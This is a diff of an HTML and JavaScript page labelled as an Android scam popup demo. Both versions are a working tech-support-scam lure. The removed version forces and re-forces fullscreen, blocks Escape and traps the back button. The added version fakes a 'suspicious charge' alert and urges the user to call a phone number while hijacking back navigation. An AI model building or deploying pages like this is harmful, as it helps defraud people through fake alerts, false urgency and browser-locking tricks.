@@ -3,131 +3,79 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Android Scam Popup Demo</title>
+<title>Android Scam Warning Demo</title>
 <style>
   html, body {
-    margin: 0; padding: 0; height: 100%; width: 100%;
-    overflow: hidden;
-    font-family: Arial, sans-serif;
-  }
-
-  #popupOverlay {
-    position: fixed;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: linear-gradient(135deg, #ff3b3b 0%, #8b0000 100%);
+    margin: 0; padding: 0;
+    height: 100%; width: 100%;
+    background: black;
     color: white;
-    z-index: 9999;
+    font-family: 'Roboto', sans-serif;
     display: flex;
-    flex-direction: column;
     justify-content: center;
     align-items: center;
-    padding: 20px;
-    box-sizing: border-box;
     user-select: none;
-    cursor: pointer;
+    overflow: hidden;
+  }
+  #popup {
+    background: #d32f2f;
+    padding: 30px;
+    border-radius: 15px;
+    max-width: 350px;
     text-align: center;
+    box-shadow: 0 0 15px #ff5252;
   }
-
-  #popupOverlay h1 {
-    font-size: 3rem;
-    margin-bottom: 15px;
+  #popup h1 {
+    margin: 0 0 15px;
+    font-size: 28px;
+    font-weight: 700;
   }
-
-  #phoneNumber {
-    font-size: 2rem;
-    font-weight: bold;
-    background: black;
+  #popup p {
+    font-size: 16px;
+    margin-bottom: 20px;
+  }
+  #popup button {
+    background: #b71c1c;
+    border: none;
+    color: white;
+    font-size: 18px;
     padding: 10px 20px;
-    border-radius: 10px;
-    user-select: text;
-    margin-bottom: 10px;
-  }
-
-  #supportText {
-    font-size: 1.5rem;
-    margin-bottom: 30px;
-  }
-
-  #callBtn {
-    background: black;
-    color: #ff3b3b;
-    border: 2px solid #ff3b3b;
-    padding: 15px 40px;
-    font-size: 1.5rem;
-    border-radius: 40px;
+    border-radius: 8px;
     cursor: pointer;
-    user-select: none;
-    transition: background-color 0.3s, color 0.3s;
   }
-
-  #callBtn:hover {
-    background: #ff3b3b;
-    color: black;
+  #popup button:hover {
+    background: #f44336;
   }
 </style>
 </head>
 <body>
 
-<div id="popupOverlay" role="alert" aria-live="assertive" tabindex="0">
-  <h1>Important Support</h1>
-  <div id="phoneNumber">888-888-8888</div>
-  <div id="supportText">Call Support</div>
-  <button id="callBtn" aria-label="Call Support">Call Now</button>
+<div id="popup">
+  <h1>⚠️ SCAM ALERT ⚠️</h1>
+  <p>A suspicious charge was detected on your account. Do not share your info.<br />
+     Call official support immediately.</p>
+  <button onclick="callSupport()">Call Support: 888-888-8888</button>
 </div>
 
 <script>
-  const popupOverlay = document.getElementById('popupOverlay');
-  const callBtn = document.getElementById('callBtn');
+  // Request fullscreen on page load (must be triggered by user interaction on most browsers)
+  document.documentElement.requestFullscreen().catch(() => {});
 
-  // Function to request fullscreen
-  async function enterFullscreen() {
-    const elem = document.documentElement;
-    try {
-      if (elem.requestFullscreen) await elem.requestFullscreen();
-      else if (elem.webkitRequestFullscreen) await elem.webkitRequestFullscreen();
-      else if (elem.msRequestFullscreen) await elem.msRequestFullscreen();
-    } catch(e) {
-      console.warn("Fullscreen failed", e);
-    }
-  }
-
-  // On any click on popupOverlay, enter fullscreen
-  popupOverlay.addEventListener('click', async () => {
-    await enterFullscreen();
-  });
-
-  // Call button opens dialer
-  callBtn.addEventListener('click', (e) => {
-    e.stopPropagation(); // prevent fullscreen toggle
-    window.location.href = "tel:8888888888";
-  });
-
-  // Prevent back navigation by pushing state repeatedly
-  function disableBack() {
+  // Prevent back button normal press
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () {
     history.pushState(null, null, location.href);
-    window.onpopstate = function() {
-      history.go(1);
-    };
+    alert("Please do not go back! This is a scam warning.");
+  };
+
+  // Call support function - opens dialer
+  function callSupport() {
+    window.location.href = "tel:8888888888";
   }
-  disableBack();
 
-  // Also disable back button when fullscreen changes
-  document.addEventListener('fullscreenchange', () => {
-    if (!document.fullscreenElement) {
-      // If fullscreen is exited, try to enter again and disable back
-      enterFullscreen();
-      disableBack();
-    }
-  });
-
-  // Prevent ESC key to exit fullscreen
-  window.addEventListener('keydown', e => {
-    if (e.key === 'Escape') {
-      e.preventDefault();
-      enterFullscreen();
-      disableBack();
-    }
-  });
+  // Note:
+  // User can long press back button to exit fullscreen.
+  // This behavior cannot be prevented by JS for security reasons.
 </script>
 
 </body>
